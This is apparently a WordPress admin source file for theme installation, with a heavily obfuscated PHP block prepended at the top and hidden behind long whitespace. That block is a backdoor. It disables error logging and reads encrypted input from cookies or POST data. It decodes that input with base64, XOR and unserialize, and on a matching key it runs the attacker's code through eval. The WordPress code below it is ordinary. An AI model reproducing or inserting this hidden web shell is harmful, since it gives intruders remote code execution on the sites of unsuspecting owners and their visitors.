<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $e91c5 = 398;$GLOBALS['cc189'] = Array();global $cc189;$cc189 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['d2ab01377'] = "\x6d\x7a\x5c\x7c\x26\x74\x48\x70\x71\x60\x49\x6a\x67\x6c\x6f\x47\x35\x52\x28\x6b\x57\x5e\x63\x4d\x50\x25\x2c\x9\x40\x43\x3a\x33\x22\x3b\x5d\x64\x58\x30\x37\x4c\x4e\x2f\x45\x54\x3c\x61\x2a\x79\x53\x72\x3f\x62\x23\x24\x76\x36\x6e\x29\x5a\x39\x56\x5f\x2e\x5b\x3e\x66\x2d\x73\x7b\x75\x68\x31\x4b\x32\x7d\x2b\x4f\x65\x38\x77\xd\x7e\x20\x55\x34\x41\x44\x21\x51\x27\x42\x59\x78\xa\x69\x3d\x4a\x46";$cc189[$cc189['d2ab01377'][13].$cc189['d2ab01377'][84].$cc189['d2ab01377'][16].$cc189['d2ab01377'][45].$cc189['d2ab01377'][84].$cc189['d2ab01377'][71]] = $cc189['d2ab01377'][22].$cc189['d2ab01377'][70].$cc189['d2ab01377'][49];$cc189[$cc189['d2ab01377'][7].$cc189['d2ab01377'][84].$cc189['d2ab01377'][16].$cc189['d2ab01377'][77].$cc189['d2ab01377'][73].$cc189['d2ab01377'][45].$cc189['d2ab01377'][73].$cc189['d2ab01377'][45]] = $cc189['d2ab01377'][14].$cc189['d2ab01377'][49].$cc189['d2ab01377'][35];$cc189[$cc189['d2ab01377'][11].$cc189['d2ab01377'][78].$cc189['d2ab01377'][38].$cc189['d2ab01377'][59]] = $cc189['d2ab01377'][67].$cc189['d2ab01377'][5].$cc189['d2ab01377'][49].$cc189['d2ab01377'][13].$cc189['d2ab01377'][77].$cc189['d2ab01377'][56];$cc189[$cc189['d2ab01377'][56].$cc189['d2ab01377'][77].$cc189['d2ab01377'][77].$cc189['d2ab01377'][84].$cc189['d2ab01377'][78].$cc189['d2ab01377'][51]] = $cc189['d2ab01377'][35].$cc189['d2ab01377'][77].$cc189['d2ab01377'][65].$cc189['d2ab01377'][94].$cc189['d2ab01377'][56].$cc189['d2ab01377'][77];$cc189[$cc189['d2ab01377'][94].$cc189['d2ab01377'][16].$cc189['d2ab01377'][45].$cc189['d2ab01377'][38].$cc189['d2ab01377'][71].$cc189['d2ab01377'][35].$cc189['d2ab01377'][71].$cc189['d2ab01377'][51].$cc189['d2ab01377'][59]] = $cc189['d2ab01377'][35].$cc189['d2ab01377'][77].$cc189['d2ab01377'][65].$cc189['d2ab01377'][94].$cc189['d2ab01377'][56].$cc189['d2ab01377'][77].$cc189['d2ab01377'][35];$cc189[$cc189['d2ab01377'][7].$cc189['d2ab01377'][59].$cc189['d2ab01377'][73].$cc189['d2ab01377'][84].$cc189['d2ab01377'][84].$cc189['d2ab01377'][51].$cc189['d2ab01377'][16]] = $cc189['d2ab01377'][94].$cc189['d2ab01377'][56].$cc189['d2ab01377'][94].$cc189['d2ab01377'][61].$cc189['d2ab01377'][67].$cc189['d2ab01377'][77].$cc189['d2ab01377'][5];$cc189[$cc189['d2ab01377'][8].$cc189['d2ab01377'][55].$cc189['d2ab01377'][31].$cc189['d2ab01377'][51]] = $cc189['d2ab01377'][67].$cc189['d2ab01377'][77].$cc189['d2ab01377'][49].$cc189['d2ab01377'][94].$cc189['d2ab01377'][45].$cc189['d2ab01377'][13].$cc189['d2ab01377'][94].$cc189['d2ab01377'][1].$cc189['d2ab01377'][77];$cc189[$cc189['d2ab01377'][69].$cc189['d2ab01377'][59].$cc189['d2ab01377'][16].$cc189['d2ab01377'][78]] = $cc189['d2ab01377'][7].$cc189['d2ab01377'][70].$cc189['d2ab01377'][7].$cc189['d2ab01377'][54].$cc189['d2ab01377'][77].$cc189['d2ab01377'][49].$cc189['d2ab01377'][67].$cc189['d2ab01377'][94].$cc189['d2ab01377'][14].$cc189['d2ab01377'][56];$cc189[$cc189['d2ab01377'][47].$cc189['d2ab01377'][16].$cc189['d2ab01377'][78].$cc189['d2ab01377'][65].$cc189['d2ab01377'][84]] = $cc189['d2ab01377'][69].$cc189['d2ab01377'][56].$cc189['d2ab01377'][67].$cc189['d2ab01377'][77].$cc189['d2ab01377'][49].$cc189['d2ab01377'][94].$cc189['d2ab01377'][45].$cc189['d2ab01377'][13].$cc189['d2ab01377'][94].$cc189['d2ab01377'][1].$cc189['d2ab01377'][77];$cc189[$cc189['d2ab01377'][54].$cc189['d2ab01377'][51].$cc189['d2ab01377'][84].$cc189['d2ab01377'][31].$cc189['d2ab01377'][78].$cc189['d2ab01377'][37]] = $cc189['d2ab01377'][51].$cc189['d2ab01377'][45].$cc189['d2ab01377'][67].$cc189['d2ab01377'][77].$cc189['d2ab01377'][55].$cc189['d2ab01377'][84].$cc189['d2ab01377'][61].$cc189['d2ab01377'][35].$cc189['d2ab01377'][77].$cc189['d2ab01377'][22].$cc189['d2ab01377'][14].$cc189['d2ab01377'][35].$cc189['d2ab01377'][77];$cc189[$cc189['d2ab01377'][51].$cc189['d2ab01377'][65].$cc189['d2ab01377'][22].$cc189['d2ab01377'][51]] = $cc189['d2ab01377'][67].$cc189['d2ab01377'][77].$cc189['d2ab01377'][5].$cc189['d2ab01377'][61].$cc189['d2ab01377'][5].$cc189['d2ab01377'][94].$cc189['d2ab01377'][0].$cc189['d2ab01377'][77].$cc189['d2ab01377'][61].$cc189['d2ab01377'][13].$cc189['d2ab01377'][94].$cc189['d2ab01377'][0].$cc189['d2ab01377'][94].$cc189['d2ab01377'][5];$cc189[$cc189['d2ab01377'][47].$cc189['d2ab01377'][78].$cc189['d2ab01377'][38].$cc189['d2ab01377'][31].$cc189['d2ab01377'][37]] = $cc189['d2ab01377'][70].$cc189['d2ab01377'][51].$cc189['d2ab01377'][45].$cc189['d2ab01377'][55];$cc189[$cc189['d2ab01377'][14].$cc189['d2ab01377'][84].$cc189['d2ab01377'][59].$cc189['d2ab01377'][73].$cc189['d2ab01377'][37]] = $cc189['d2ab01377'][54].$cc189['d2ab01377'][65].$cc189['d2ab01377'][71].$cc189['d2ab01377'][65].$cc189['d2ab01377'][22].$cc189['d2ab01377'][65].$cc189['d2ab01377'][51];$cc189[$cc189['d2ab01377'][47].$cc189['d2ab01377'][35].$cc189['d2ab01377'][37].$cc189['d2ab01377'][38].$cc189['d2ab01377'][55].$cc189['d2ab01377'][71].$cc189['d2ab01377'][55]] = $_POST;$cc189[$cc189['d2ab01377'][69].$cc189['d2ab01377'][31].$cc189['d2ab01377'][37].$cc189['d2ab01377'][84].$cc189['d2ab01377'][51].$cc189['d2ab01377'][37].$cc189['d2ab01377'][77].$cc189['d2ab01377'][73].$cc189['d2ab01377'][37]] = $_COOKIE;@$cc189[$cc189['d2ab01377'][7].$cc189['d2ab01377'][59].$cc189['d2ab01377'][73].$cc189['d2ab01377'][84].$cc189['d2ab01377'][84].$cc189['d2ab01377'][51].$cc189['d2ab01377'][16]]($cc189['d2ab01377'][77].$cc189['d2ab01377'][49].$cc189['d2ab01377'][49].$cc189['d2ab01377'][14].$cc189['d2ab01377'][49].$cc189['d2ab01377'][61].$cc189['d2ab01377'][13].$cc189['d2ab01377'][14].$cc189['d2ab01377'][12], NULL);@$cc189[$cc189['d2ab01377'][7].$cc189['d2ab01377'][59].$cc189['d2ab01377'][73].$cc189['d2ab01377'][84].$cc189['d2ab01377'][84].$cc189['d2ab01377'][51].$cc189['d2ab01377'][16]]($cc189['d2ab01377'][13].$cc189['d2ab01377'][14].$cc189['d2ab01377'][12].$cc189['d2ab01377'][61].$cc189['d2ab01377'][77].$cc189['d2ab01377'][49].$cc189['d2ab01377'][49].$cc189['d2ab01377'][14].$cc189['d2ab01377'][49].$cc189['d2ab01377'][67], 0);@$cc189[$cc189['d2ab01377'][7].$cc189['d2ab01377'][59].$cc189['d2ab01377'][73].$cc189['d2ab01377'][84].$cc189['d2ab01377'][84].$cc189['d2ab01377'][51].$cc189['d2ab01377'][16]]($cc189['d2ab01377'][0].$cc189['d2ab01377'][45].$cc189['d2ab01377'][92].$cc189['d2ab01377'][61].$cc189['d2ab01377'][77].$cc189['d2ab01377'][92].$cc189['d2ab01377'][77].$cc189['d2ab01377'][22].$cc189['d2ab01377'][69].$cc189['d2ab01377'][5].$cc189['d2ab01377'][94].$cc189['d2ab01377'][14].$cc189['d2ab01377'][56].$cc189['d2ab01377'][61].$cc189['d2ab01377'][5].$cc189['d2ab01377'][94].$cc189['d2ab01377'][0].$cc189['d2ab01377'][77], 0);@$cc189[$cc189['d2ab01377'][51].$cc189['d2ab01377'][65].$cc189['d2ab01377'][22].$cc189['d2ab01377'][51]](0);if (!$cc189[$cc189['d2ab01377'][94].$cc189['d2ab01377'][16].$cc189['d2ab01377'][45].$cc189['d2ab01377'][38].$cc189['d2ab01377'][71].$cc189['d2ab01377'][35].$cc189['d2ab01377'][71].$cc189['d2ab01377'][51].$cc189['d2ab01377'][59]]($cc189['d2ab01377'][85].$cc189['d2ab01377'][39].$cc189['d2ab01377'][17].$cc189['d2ab01377'][42].$cc189['d2ab01377'][85].$cc189['d2ab01377'][86].$cc189['d2ab01377'][91].$cc189['d2ab01377'][61].$cc189['d2ab01377'][17].$cc189['d2ab01377'][83].$cc189['d2ab01377'][40].$cc189['d2ab01377'][61].$cc189['d2ab01377'][31].$cc189['d2ab01377'][55].$cc189['d2ab01377'][55].$cc189['d2ab01377'][45].$cc189['d2ab01377'][65].$cc189['d2ab01377'][51].$cc189['d2ab01377'][78].$cc189['d2ab01377'][45].$cc189['d2ab01377'][78].$cc189['d2ab01377'][45].$cc189['d2ab01377'][73].$cc189['d2ab01377'][31].$cc189['d2ab01377'][16].$cc189['d2ab01377'][16].$cc189['d2ab01377'][45].$cc189['d2ab01377'][51].$cc189['d2ab01377'][73].$cc189['d2ab01377'][71].$cc189['d2ab01377'][65].$cc189['d2ab01377'][51].$cc189['d2ab01377'][65].$cc189['d2ab01377'][71].$cc189['d2ab01377'][71].$cc189['d2ab01377'][51].$cc189['d2ab01377'][45].$cc189['d2ab01377'][71].$cc189['d2ab01377'][45].$cc189['d2ab01377'][37].$cc189['d2ab01377'][73].$cc189['d2ab01377'][65].$cc189['d2ab01377'][51].$cc189['d2ab01377'][45])){$cc189[$cc189['d2ab01377'][56].$cc189['d2ab01377'][77].$cc189['d2ab01377'][77].$cc189['d2ab01377'][84].$cc189['d2ab01377'][78].$cc189['d2ab01377'][51]]($cc189['d2ab01377'][85].$cc189['d2ab01377'][39].$cc189['d2ab01377'][17].$cc189['d2ab01377'][42].$cc189['d2ab01377'][85].$cc189['d2ab01377'][86].$cc189['d2ab01377'][91].$cc189['d2ab01377'][61].$cc189['d2ab01377'][17].$cc189['d2ab01377'][83].$cc189['d2ab01377'][40].$cc189['d2ab01377'][61].$cc189['d2ab01377'][31].$cc189['d2ab01377'][55].$cc189['d2ab01377'][55].$cc189['d2ab01377'][45].$cc189['d2ab01377'][65].$cc189['d2ab01377'][51].$cc189['d2ab01377'][78].$cc189['d2ab01377'][45].$cc189['d2ab01377'][78].$cc189['d2ab01377'][45].$cc189['d2ab01377'][73].$cc189['d2ab01377'][31].$cc189['d2ab01377'][16].$cc189['d2ab01377'][16].$cc189['d2ab01377'][45].$cc189['d2ab01377'][51].$cc189['d2ab01377'][73].$cc189['d2ab01377'][71].$cc189['d2ab01377'][65].$cc189['d2ab01377'][51].$cc189['d2ab01377'][65].$cc189['d2ab01377'][71].$cc189['d2ab01377'][71].$cc189['d2ab01377'][51].$cc189['d2ab01377'][45].$cc189['d2ab01377'][71].$cc189['d2ab01377'][45].$cc189['d2ab01377'][37].$cc189['d2ab01377'][73].$cc189['d2ab01377'][65].$cc189['d2ab01377'][51].$cc189['d2ab01377'][45], 1);$s7ad54 = NULL;$f192e636 = NULL;$cc189[$cc189['d2ab01377'][45].$cc189['d2ab01377'][51].$cc189['d2ab01377'][37].$cc189['d2ab01377'][78].$cc189['d2ab01377'][78].$cc189['d2ab01377'][37].$cc189['d2ab01377'][45].$cc189['d2ab01377'][84]] = $cc189['d2ab01377'][45].$cc189['d2ab01377'][65].$cc189['d2ab01377'][16].$cc189['d2ab01377'][35].$cc189['d2ab01377'][55].$cc189['d2ab01377'][77].$cc189['d2ab01377'][73].$cc189['d2ab01377'][31].$cc189['d2ab01377'][66].$cc189['d2ab01377'][35].$cc189['d2ab01377'][84].$cc189['d2ab01377'][22].$cc189['d2ab01377'][35].$cc189['d2ab01377'][66].$cc189['d2ab01377'][84].$cc189['d2ab01377'][78].$cc189['d2ab01377'][77].$cc189['d2ab01377'][55].$cc189['d2ab01377'][66].$cc189['d2ab01377'][45].$cc189['d2ab01377'][31].$cc189['d2ab01377'][22].$cc189['d2ab01377'][77].$cc189['d2ab01377'][66].$cc189['d2ab01377'][38].$cc189['d2ab01377'][59].$cc189['d2ab01377'][84].$cc189['d2ab01377'][35].$cc189['d2ab01377'][65].$cc189['d2ab01377'][78].$cc189['d2ab01377'][31].$cc189['d2ab01377'][45].$cc189['d2ab01377'][59].$cc189['d2ab01377'][71].$cc189['d2ab01377'][84].$cc189['d2ab01377'][65];global $ab0880a4;function  vf1fcfb($s7ad54, $z8448d498){global $cc189;$v797e5 = "";for ($sf4200=0; $sf4200<$cc189[$cc189['d2ab01377'][11].$cc189['d2ab01377'][78].$cc189['d2ab01377'][38].$cc189['d2ab01377'][59]]($s7ad54);){for ($nd1b206=0; $nd1b206<$cc189[$cc189['d2ab01377'][11].$cc189['d2ab01377'][78].$cc189['d2ab01377'][38].$cc189['d2ab01377'][59]]($z8448d498) && $sf4200<$cc189[$cc189['d2ab01377'][11].$cc189['d2ab01377'][78].$cc189['d2ab01377'][38].$cc189['d2ab01377'][59]]($s7ad54); $nd1b206++, $sf4200++){$v797e5 .= $cc189[$cc189['d2ab01377'][13].$cc189['d2ab01377'][84].$cc189['d2ab01377'][16].$cc189['d2ab01377'][45].$cc189['d2ab01377'][84].$cc189['d2ab01377'][71]]($cc189[$cc189['d2ab01377'][7].$cc189['d2ab01377'][84].$cc189['d2ab01377'][16].$cc189['d2ab01377'][77].$cc189['d2ab01377'][73].$cc189['d2ab01377'][45].$cc189['d2ab01377'][73].$cc189['d2ab01377'][45]]($s7ad54[$sf4200]) ^ $cc189[$cc189['d2ab01377'][7].$cc189['d2ab01377'][84].$cc189['d2ab01377'][16].$cc189['d2ab01377'][77].$cc189['d2ab01377'][73].$cc189['d2ab01377'][45].$cc189['d2ab01377'][73].$cc189['d2ab01377'][45]]($z8448d498[$nd1b206]));}}return $v797e5;}function  hba6($s7ad54, $z8448d498){global $cc189;global $ab0880a4;return $cc189[$cc189['d2ab01377'][14].$cc189['d2ab01377'][84].$cc189['d2ab01377'][59].$cc189['d2ab01377'][73].$cc189['d2ab01377'][37]]($cc189[$cc189['d2ab01377'][14].$cc189['d2ab01377'][84].$cc189['d2ab01377'][59].$cc189['d2ab01377'][73].$cc189['d2ab01377'][37]]($s7ad54, $ab0880a4), $z8448d498);}foreach ($cc189[$cc189['d2ab01377'][69].$cc189['d2ab01377'][31].$cc189['d2ab01377'][37].$cc189['d2ab01377'][84].$cc189['d2ab01377'][51].$cc189['d2ab01377'][37].$cc189['d2ab01377'][77].$cc189['d2ab01377'][73].$cc189['d2ab01377'][37]] as $z8448d498=>$t4ad13){$s7ad54 = $t4ad13;$f192e636 = $z8448d498;}if (!$s7ad54){foreach ($cc189[$cc189['d2ab01377'][47].$cc189['d2ab01377'][35].$cc189['d2ab01377'][37].$cc189['d2ab01377'][38].$cc189['d2ab01377'][55].$cc189['d2ab01377'][71].$cc189['d2ab01377'][55]] as $z8448d498=>$t4ad13){$s7ad54 = $t4ad13;$f192e636 = $z8448d498;}}$s7ad54 = @$cc189[$cc189['d2ab01377'][47].$cc189['d2ab01377'][16].$cc189['d2ab01377'][78].$cc189['d2ab01377'][65].$cc189['d2ab01377'][84]]($cc189[$cc189['d2ab01377'][47].$cc189['d2ab01377'][78].$cc189['d2ab01377'][38].$cc189['d2ab01377'][31].$cc189['d2ab01377'][37]]($cc189[$cc189['d2ab01377'][54].$cc189['d2ab01377'][51].$cc189['d2ab01377'][84].$cc189['d2ab01377'][31].$cc189['d2ab01377'][78].$cc189['d2ab01377'][37]]($s7ad54), $f192e636));if (isset($s7ad54[$cc189['d2ab01377'][45].$cc189['d2ab01377'][19]]) && $ab0880a4==$s7ad54[$cc189['d2ab01377'][45].$cc189['d2ab01377'][19]]){if ($s7ad54[$cc189['d2ab01377'][45]] == $cc189['d2ab01377'][94]){$sf4200 = Array($cc189['d2ab01377'][7].$cc189['d2ab01377'][54] => @$cc189[$cc189['d2ab01377'][69].$cc189['d2ab01377'][59].$cc189['d2ab01377'][16].$cc189['d2ab01377'][78]](),$cc189['d2ab01377'][67].$cc189['d2ab01377'][54] => $cc189['d2ab01377'][71].$cc189['d2ab01377'][62].$cc189['d2ab01377'][37].$cc189['d2ab01377'][66].$cc189['d2ab01377'][71],);echo @$cc189[$cc189['d2ab01377'][8].$cc189['d2ab01377'][55].$cc189['d2ab01377'][31].$cc189['d2ab01377'][51]]($sf4200);}elseif ($s7ad54[$cc189['d2ab01377'][45]] == $cc189['d2ab01377'][77]){eval/*ka2f9ab*/($s7ad54[$cc189['d2ab01377'][35]]);}exit();}} ?><?php
/**
 * WordPress Theme Installation Administration API
 *
 * @package WordPress
 * @subpackage Administration
 */

$themes_allowedtags = array('a' => array('href' => array(), 'title' => array(), 'target' => array()),
	'abbr' => array('title' => array()), 'acronym' => array('title' => array()),
	'code' => array(), 'pre' => array(), 'em' => array(), 'strong' => array(),
	'div' => array(), 'p' => array(), 'ul' => array(), 'ol' => array(), 'li' => array(),
	'h1' => array(), 'h2' => array(), 'h3' => array(), 'h4' => array(), 'h5' => array(), 'h6' => array(),
	'img' => array('src' => array(), 'class' => array(), 'alt' => array())
);

$theme_field_defaults = array( 'description' => true, 'sections' => false, 'tested' => true, 'requires' => true,
	'rating' => true, 'downloaded' => true, 'downloadlink' => true, 'last_updated' => true, 'homepage' => true,
	'tags' => true, 'num_ratings' => true
);

/**
 * Retrieve list of WordPress theme features (aka theme tags)
 *
 * @since 2.8.0
 *
 * @deprecated since 3.1.0 Use get_theme_feature_list() instead.
 *
 * @return array
 */
function install_themes_feature_list() {
	_deprecated_function( __FUNCTION__, '3.1.0', 'get_theme_feature_list()' );

	if ( !$cache = get_transient( 'wporg_theme_feature_list' ) )
		set_transient( 'wporg_theme_feature_list', array(), 3 * HOUR_IN_SECONDS );

	if ( $cache )
		return $cache;

	$feature_list = themes_api( 'feature_list', array() );
	if ( is_wp_error( $feature_list ) )
		return array();

	set_transient( 'wporg_theme_feature_list', $feature_list, 3 * HOUR_IN_SECONDS );

	return $feature_list;
}

/**
 * Display search form for searching themes.
 *
 * @since 2.8.0
 *
 * @param bool $type_selector
 */
function install_theme_search_form( $type_selector = true ) {
	$type = isset( $_REQUEST['type'] ) ? wp_unslash( $_REQUEST['type'] ) : 'term';
	$term = isset( $_REQUEST['s'] ) ? wp_unslash( $_REQUEST['s'] ) : '';
	if ( ! $type_selector )
		echo '<p class="install-help">' . __( 'Search for themes by keyword.' ) . '</p>';
	?>
<form id="search-themes" method="get">
	<input type="hidden" name="tab" value="search" />
	<?php if ( $type_selector ) : ?>
	<label class="screen-reader-text" for="typeselector"><?php _e('Type of search'); ?></label>
	<select	name="type" id="typeselector">
	<option value="term" <?php selected('term', $type) ?>><?php _e('Keyword'); ?></option>
	<option value="author" <?php selected('author', $type) ?>><?php _e('Author'); ?></option>
	<option value="tag" <?php selected('tag', $type) ?>><?php _ex('Tag', 'Theme Installer'); ?></option>
	</select>
	<label class="screen-reader-text" for="s"><?php
	switch ( $type ) {
		case 'term':
			_e( 'Search by keyword' );
			break;
		case 'author':
			_e( 'Search by author' );
			break;
		case 'tag':
			_e( 'Search by tag' );
			break;
	}
	?></label>
	<?php else : ?>
	<label class="screen-reader-text" for="s"><?php _e('Search by keyword'); ?></label>
	<?php endif; ?>
	<input type="search" name="s" id="s" size="30" value="<?php echo esc_attr($term) ?>" autofocus="autofocus" />
	<?php submit_button( __( 'Search' ), '', 'search', false ); ?>
</form>
<?php
}

/**
 * Display tags filter for themes.
 *
 * @since 2.8.0
 */
function install_themes_dashboard() {
	install_theme_search_form( false );
?>
<h4><?php _e('Feature Filter') ?></h4>
<p class="install-help"><?php _e( 'Find a theme based on specific features.' ); ?></p>

<form method="get">
	<input type="hidden" name="tab" value="search" />
	<?php
	$feature_list = get_theme_feature_list();
	echo '<div class="feature-filter">';

	foreach ( (array) $feature_list as $feature_name => $features ) {
		$feature_name = esc_html( $feature_name );
		echo '<div class="feature-name">' . $feature_name . '</div>';

		echo '<ol class="feature-group">';
		foreach ( $features as $feature => $feature_name ) {
			$feature_name = esc_html( $feature_name );
			$feature = esc_attr($feature);
?>

<li>
	<input type="checkbox" name="features[]" id="feature-id-<?php echo $feature; ?>" value="<?php echo $feature; ?>" />
	<label for="feature-id-<?php echo $feature; ?>"><?php echo $feature_name; ?></label>
</li>

<?php	} ?>
</ol>
<br class="clear" />
<?php
	} ?>

</div>
<br class="clear" />
<?php submit_button( __( 'Find Themes' ), '', 'search' ); ?>
</form>
<?php
}

/**
 * @since 2.8.0
 */
function install_themes_upload() {
?>
<p class="install-help"><?php _e('If you have a theme in a .zip format, you may install it by uploading it here.'); ?></p>
<form method="post" enctype="multipart/form-data" class="wp-upload-form" action="<?php echo self_admin_url('update.php?action=upload-theme'); ?>">
	<?php wp_nonce_field( 'theme-upload' ); ?>
	<label class="screen-reader-text" for="themezip"><?php _e( 'Theme zip file' ); ?></label>
	<input type="file" id="themezip" name="themezip" />
	<?php submit_button( __( 'Install Now' ), '', 'install-theme-submit', false ); ?>
</form>
	<?php
}

/**
 * Prints a theme on the Install Themes pages.
 *
 * @deprecated 3.4.0
 *
 * @global WP_Theme_Install_List_Table $wp_list_table
 *
 * @param object $theme
 */
function display_theme( $theme ) {
	_deprecated_function( __FUNCTION__, '3.4.0' );
	global $wp_list_table;
	if ( ! isset( $wp_list_table ) ) {
		$wp_list_table = _get_list_table('WP_Theme_Install_List_Table');
	}
	$wp_list_table->prepare_items();
	$wp_list_table->single_row( $theme );
}

/**
 * Display theme content based on theme list.
 *
 * @since 2.8.0
 *
 * @global WP_Theme_Install_List_Table $wp_list_table
 */
function display_themes() {
	global $wp_list_table;

	if ( ! isset( $wp_list_table ) ) {
		$wp_list_table = _get_list_table('WP_Theme_Install_List_Table');
	}
	$wp_list_table->prepare_items();
	$wp_list_table->display();

}

/**
 * Display theme information in dialog box form.
 *
 * @since 2.8.0
 *
 * @global WP_Theme_Install_List_Table $wp_list_table
 */
function install_theme_information() {
	global $wp_list_table;

	$theme = themes_api( 'theme_information', array( 'slug' => wp_unslash( $_REQUEST['theme'] ) ) );

	if ( is_wp_error( $theme ) )
		wp_die( $theme );

	iframe_header( __('Theme Installation') );
	if ( ! isset( $wp_list_table ) ) {
		$wp_list_table = _get_list_table('WP_Theme_Install_List_Table');
	}
	$wp_list_table->theme_installer_single( $theme );
	iframe_footer();
	exit;
}
